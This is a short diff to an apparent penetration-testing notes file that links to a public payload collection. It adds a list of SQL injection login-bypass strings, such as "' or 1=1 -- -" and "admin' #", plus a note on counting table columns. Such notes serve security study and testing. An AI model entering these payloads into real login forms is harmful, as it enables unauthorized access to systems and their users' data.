@@ -236,6 +236,16 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 - WIP
 ```
 
+Simple SQL Injection Log In bypass
+Try a lot of them out:
+```
+' or '1'='1'-- -
+' or 1=1 -- -
+' or 1=1#
+admin' -- -
+admin' #
+```
+
 Check number of column:
 When SQLi is possible, if n+1 does not return anything, n is the number of column in the table
 ```
